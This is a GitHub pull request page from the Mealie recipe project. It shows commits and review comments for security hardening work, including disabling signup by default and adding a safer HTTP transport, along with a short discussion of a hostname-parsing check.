[![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=80&v=4)](/boc-the-git)

Copy link

Collaborator

### **[boc-the-git](/boc-the-git)** commented [Mar 28, 2024](#issuecomment-2024949832)

| [@p0lycarpio](https://github.com/p0lycarpio) do you want to raise a feature request for that (or discuss it on Discord)? We wouldn't likely tackle that under this PR.  That's more a *privacy issue* than a *security issue*, if you take my meaning. I don't have strong feelings on it one way or the other; other people might. |
| --- |

All reactions

Sorry, something went wrong.

 [hay-kot](/hay-kot)
and others
added 10 commits
[March 30, 2024 22:07](#commits-pushed-185965e)

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[change ALLOW_SIGNUP to default to false](/mealie-recipes/mealie/pull/3368/commits/185965e80bd977a468777ab46acf847ed4d66124 "change ALLOW_SIGNUP to default to false")`

`[185965e](/mealie-recipes/mealie/pull/3368/commits/185965e80bd977a468777ab46acf847ed4d66124)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[add 1.4.0 tag for OIDC docs](/mealie-recipes/mealie/pull/3368/commits/5c05a3e9f93789be4778a02ecb7d16f55028a2c5 "add 1.4.0 tag for OIDC docs")`

`[5c05a3e](/mealie-recipes/mealie/pull/3368/commits/5c05a3e9f93789be4778a02ecb7d16f55028a2c5)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[new notes on security inline with security/policy review](/mealie-recipes/mealie/pull/3368/commits/7f5e587e73dcff4855f33fb54c38e87d9f618a57 "new notes on security inline with security/policy review")`

`[7f5e587](/mealie-recipes/mealie/pull/3368/commits/7f5e587e73dcff4855f33fb54c38e87d9f618a57)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[safer transport for external requests](/mealie-recipes/mealie/pull/3368/commits/7f43248ced1348cca08c5feb85ba3073ef61fb69 "safer transport for external requests")`

`[7f43248](/mealie-recipes/mealie/pull/3368/commits/7f43248ced1348cca08c5feb85ba3073ef61fb69)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[fix linter errors](/mealie-recipes/mealie/pull/3368/commits/021daee103a86cf486330f009cdbcb98c11bf1bb "fix linter errors")`

`[021daee](/mealie-recipes/mealie/pull/3368/commits/021daee103a86cf486330f009cdbcb98c11bf1bb)`

[![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=40&v=4)](/boc-the-git) [![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[docs: Tidy up wording/formatting](/mealie-recipes/mealie/pull/3368/commits/42f05ab2e5dbdc6cca3fe01f09aace20b7edd60a "docs: Tidy up wording/formatting")`

`[42f05ab](/mealie-recipes/mealie/pull/3368/commits/42f05ab2e5dbdc6cca3fe01f09aace20b7edd60a)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[fix request errors](/mealie-recipes/mealie/pull/3368/commits/ea35d46acf00e0c8fadebbd7e96aa0bd0491942f "fix request errors")`

`[ea35d46](/mealie-recipes/mealie/pull/3368/commits/ea35d46acf00e0c8fadebbd7e96aa0bd0491942f)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[whoops](/mealie-recipes/mealie/pull/3368/commits/edaee08eb8d726c9d605aafe84397a886881d5ac "whoops")`

`[edaee08](/mealie-recipes/mealie/pull/3368/commits/edaee08eb8d726c9d605aafe84397a886881d5ac)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[fix implementation with std lib](/mealie-recipes/mealie/pull/3368/commits/d321dce68817301c85ecbf527205e3931dac45ad "fix implementation with std lib")`

`[d321dce](/mealie-recipes/mealie/pull/3368/commits/d321dce68817301c85ecbf527205e3931dac45ad)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[format](/mealie-recipes/mealie/pull/3368/commits/f34b5eee28ecd94a87a72485e42e3297912b5f06 "format")`

`[f34b5ee](/mealie-recipes/mealie/pull/3368/commits/f34b5eee28ecd94a87a72485e42e3297912b5f06)`

 [![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&u=e9c77c8ed0c343395605b0468ca65565bc7907c0&v=4)](/hay-kot)
[hay-kot](/hay-kot)
[force-pushed](/mealie-recipes/mealie/compare/821d68b95ba2b8b56fef59805bcee48ce6223a03..f34b5eee28ecd94a87a72485e42e3297912b5f06)
the
security/gh-security-recs

branch
from
[`821d68b`](/mealie-recipes/mealie/commit/821d68b95ba2b8b56fef59805bcee48ce6223a03) to
[`f34b5ee`](/mealie-recipes/mealie/commit/f34b5eee28ecd94a87a72485e42e3297912b5f06)  [Compare](/mealie-recipes/mealie/compare/821d68b95ba2b8b56fef59805bcee48ce6223a03..f34b5eee28ecd94a87a72485e42e3297912b5f06)
[March 31, 2024 03:07](#event-12302222927)

 [![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&u=e9c77c8ed0c343395605b0468ca65565bc7907c0&v=4)](/hay-kot)
[hay-kot](/hay-kot)
requested a review
from [boc-the-git](/boc-the-git)
[April 1, 2024 01:57](#event-12305580212)

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=80&u=e9c77c8ed0c343395605b0468ca65565bc7907c0&v=4)](/hay-kot)

Copy link

Collaborator

Author

### **[hay-kot](/hay-kot)** commented [Apr 1, 2024](#issuecomment-2029026406)

| [@boc-the-git](https://github.com/boc-the-git) should be good now. Thanks to some folks on discord it's 99% less bad too! |
| --- |

 🎉
1
 boc-the-git reacted with hooray emoji

All reactions

* 🎉
  1 reaction

Sorry, something went wrong.

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&u=e9c77c8ed0c343395605b0468ca65565bc7907c0&v=4)](/hay-kot)
[hay-kot](/hay-kot)
mentioned this pull request
[Apr 1, 2024](#ref-pullrequest-2213164804)

[fix: TLS fingerprinting prevents scraping #2888
#3384](/mealie-recipes/mealie/pull/3384)
 Closed

[![boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=60&v=4)](/boc-the-git)

**[boc-the-git](/boc-the-git)**
reviewed
[Apr 1, 2024](#pullrequestreview-1970930080)

 [View reviewed changes](/mealie-recipes/mealie/pull/3368/files/f34b5eee28ecd94a87a72485e42e3297912b5f06)

[mealie/pkgs/safehttp/transport.py](/mealie-recipes/mealie/pull/3368/files/f34b5eee28ecd94a87a72485e42e3297912b5f06#diff-7cabaaea41f93e5009444bbd80f48921596f95ead3e41ee45f1fe154d41be858)
Outdated

|  |  | netloc = request.url.netloc.decode() |
| --- | --- | --- |
|  |  | if ":" in netloc: # Either an IP, or a hostname:port combo |
|  |  | netloc\_parts = netloc.split(":") |
|  |  | if len(netloc\_parts) > 1: # netloc of username:password@hostname:port not supported |

Copy link

Collaborator

### @boc-the-git **[boc-the-git](/boc-the-git)** [Apr 1, 2024](#discussion_r1546127287)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

The check here doesn't align with the comment.. should this be checking for `... > 2`?

I won't stop this delaying a merge, but will circle back to it, via Discord.

Sorry, something went wrong.

All reactions

Copy link

Collaborator

### @boc-the-git **[boc-the-git](/boc-the-git)** [Apr 1, 2024](#discussion_r1546132981)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

`... > 1` will always be true, except in some weird scenario where `:` was the first or last character of `netloc` (and tbh I'm not certain what happens in that scenario)

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @tba-code **[tba-code](/tba-code)** [Apr 1, 2024](#discussion_r1546208683)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

It was a typo.

Sorry, something went wrong.

 👍
1
 boc-the-git reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

[mealie/pkgs/safehttp/transport.py](/mealie-recipes/mealie/pull/3368/files/f34b5eee28ecd94a87a72485e42e3297912b5f06#diff-7cabaaea41f93e5009444bbd80f48921596f95ead3e41ee45f1fe154d41be858)
Outdated

Show resolved

Hide resolved

[mealie/pkgs/safehttp/transport.py](/mealie-recipes/mealie/pull/3368/files/f34b5eee28ecd94a87a72485e42e3297912b5f06#diff-7cabaaea41f93e5009444bbd80f48921596f95ead3e41ee45f1fe154d41be858)

Show resolved

Hide resolved

[![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=40&v=4)](/boc-the-git)

`[Remove check on netloc_parts. It only includes URL after any @](/mealie-recipes/mealie/pull/3368/commits/1d116ac3d44a7c89fc7e08ce02eb935fe00dcbd1 "Remove check on netloc_parts. It only includes URL after any @")`

`[1d116ac](/mealie-recipes/mealie/pull/3368/commits/1d116ac3d44a7c89fc7e08ce02eb935fe00dcbd1)`

[![boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=60&v=4)](/boc-the-git)

**[boc-the-git](/boc-the-git)**
reviewed
[Apr 1, 2024](#pullrequestreview-1970982674)

 [View reviewed changes](/mealie-recipes/mealie/pull/3368/files/1d116ac3d44a7c89fc7e08ce02eb935fe00dcbd1)

[mealie/pkgs/safehttp/transport.py](/mealie-recipes/mealie/pull/3368/files/f34b5eee28ecd94a87a72485e42e3297912b5f06..1d116ac3d44a7c89fc7e08ce02eb935fe00dcbd1#diff-7cabaaea41f93e5009444bbd80f48921596f95ead3e41ee45f1fe154d41be858)
Outdated

|  |  | @@ -46,8 +46,6 @@ async def handle\_async\_request(self, request): | |
| --- | --- | --- | --- |
|  |  | netloc = request.url.netloc.decode() |
|  |  | if ":" in netloc: # Either an IP, or a hostname:port combo |
|  |  | netloc\_parts = netloc.split(":") |
|  |  | if len(netloc\_parts) > 1: # netloc of username:password@hostname:port not supported |

Copy link

Collaborator

### @boc-the-git **[boc-the-git](/boc-the-git)** [Apr 1, 2024](#discussion_r1546158867)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

[@hay-kot](https://github.com/hay-kot) see this log.. showing that even when `user:pass` is included in the url, it was being stripped out before getting to this netloc variable. Thus, the check on parts is irrelevant here.

[![image](https://private-user-images.githubusercontent.com/3479092/318396839-49f3101b-c775-4eb4-a534-cbcfca795f9e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxODM5NjgzOS00OWYzMTAxYi1jNzc1LTRlYjQtYTUzNC1jYmNmY2E3OTVmOWUucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZGZlMWJmZjk0ZTZlNmJlNjc1ZDQ1ZTBlZWZkMmY5YjkyMTUxOWI2NGMxMjU1NWZhODUwMDE0MTdkM2M3MzFjZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.9bdOqpJMmiaTGWa4pjDDXzinykZYGw1Jr8uP58o_W-g)](https://private-user-images.githubusercontent.com/3479092/318396839-49f3101b-c775-4eb4-a534-cbcfca795f9e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTUxNjMsIm5iZiI6MTczNjYxNDg2MywicGF0aCI6Ii8zNDc5MDkyLzMxODM5NjgzOS00OWYzMTAxYi1jNzc1LTRlYjQtYTUzNC1jYmNmY2E3OTVmOWUucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTcwMTAzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZGZlMWJmZjk0ZTZlNmJlNjc1ZDQ1ZTBlZWZkMmY5YjkyMTUxOWI2NGMxMjU1NWZhODUwMDE0MTdkM2M3MzFjZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.9bdOqpJMmiaTGWa4pjDDXzinykZYGw1Jr8uP58o_W-g)

Sorry, something went wrong.

All reactions

[![boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=60&v=4)](/boc-the-git)

**[boc-the-git](/boc-the-git)**
approved these changes
[Apr 1, 2024](#pullrequestreview-1970984163)

 [View reviewed changes](/mealie-recipes/mealie/pull/3368/files/8fd581f3cf53b6e72ff214244c5e0437c523fee3)

[![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=80&v=4)](/boc-the-git)

Copy link

Collaborator

### **[boc-the-git](/boc-the-git)** commented [Apr 1, 2024](#issuecomment-2029484809)

| [@hay-kot](https://github.com/hay-kot) this has my blessing, but note I had to make a fix. Please review, and merge/release as desired. |
| --- |

 🎉
3
 tba-code, bpbradley, and jloewe reacted with hooray emoji

All reactions

* 🎉
  3 reactions

Sorry, something went wrong.

 [hay-kot](/hay-kot)
added 2 commits
[April 1, 2024 09:14](#commits-pushed-4063be8)

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[Merge branch 'mealie-next' into security/gh-security-recs](/mealie-recipes/mealie/pull/3368/commits/4063be8a61d84a5d1ce328a50d56a3a936a9306b "Merge branch 'mealie-next' into security/gh-security-recs")`

`[4063be8](/mealie-recipes/mealie/pull/3368/commits/4063be8a61d84a5d1ce328a50d56a3a936a9306b)`

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot)

`[Merge branch 'mealie-next' into security/gh-security-recs](/mealie-recipes/mealie/pull/3368/commits/8fd581f3cf53b6e72ff214244c5e0437c523fee3 "Merge branch 'mealie-next' into security/gh-security-recs")`

`[8fd581f](/mealie-recipes/mealie/pull/3368/commits/8fd581f3cf53b6e72ff214244c5e0437c523fee3)`

 Hide details
View details

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&u=e9c77c8ed0c343395605b0468ca65565bc7907c0&v=4)](/hay-kot)
[hay-kot](/hay-kot)
merged commit [`2a3463b`](/mealie-recipes/mealie/commit/2a3463b7466bc297aede50046da9550d919ec56f)
into
mealie-next

[Apr 2, 2024](https://github.com/mealie-recipes/mealie/pull/3368#event-12327593873)
10 checks passed

 [![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&u=e9c77c8ed0c343395605b0468ca65565bc7907c0&v=4)](/hay-kot)
[hay-kot](/hay-kot)
deleted the
security/gh-security-recs

branch
[April 2, 2024 15:04](#event-12327594066)

[![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=40&v=4)](/boc-the-git)
[boc-the-git](/boc-the-git)
mentioned this pull request
[Apr 10, 2024](#ref-issue-2186970174)

[Github Security Lab Vulnerability Report
#3315](/mealie-recipes/mealie/issues/3315)

Closed

[![@bilhert](https://avatars.githubusercontent.com/u/39261677?s=40&v=4)](/bilhert)
[bilhert](/bilhert)
mentioned this pull request
[Apr 15, 2024](#ref-pullrequest-2102000454)

[Fixes #990 ah.nl no longer working
hhursev/recipe-scrapers#992](/hhursev/recipe-scrapers/pull/992)
 Closed

[![@p0lycarpio](https://avatars.githubusercontent.com/u/66876397?s=40&u=45c8e63dc7ff1c2022442f0d8ef314d43a0a68a1&v=4)](/p0lycarpio)
[p0lycarpio](/p0lycarpio)
mentioned this pull request
[Apr 16, 2024](#ref-pullrequest-2246673295)

[fix: make groups private by default
#3474](/mealie-recipes/mealie/pull/3474)
 Merged

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fmealie-recipes%2Fmealie%2Fpull%2F3368)

Reviewers

[![@tba-code](https://avatars.githubusercontent.com/u/128998790?s=40&v=4)](/tba-code) [tba-code](/tba-code)

tba-code left review comments

[![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=40&v=4)](/boc-the-git) [boc-the-git](/boc-the-git)

boc-the-git approved these changes

Assignees

[![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=40&v=4)](/boc-the-git) [boc-the-git](/boc-the-git)

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

4 participants

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=52&v=4)](/hay-kot) [![@p0lycarpio](https://avatars.githubusercontent.com/u/66876397?s=52&v=4)](/p0lycarpio) [![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=52&v=4)](/boc-the-git) [![@tba-code](https://avatars.githubusercontent.com/u/128998790?s=52&v=4)](/tba-code)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


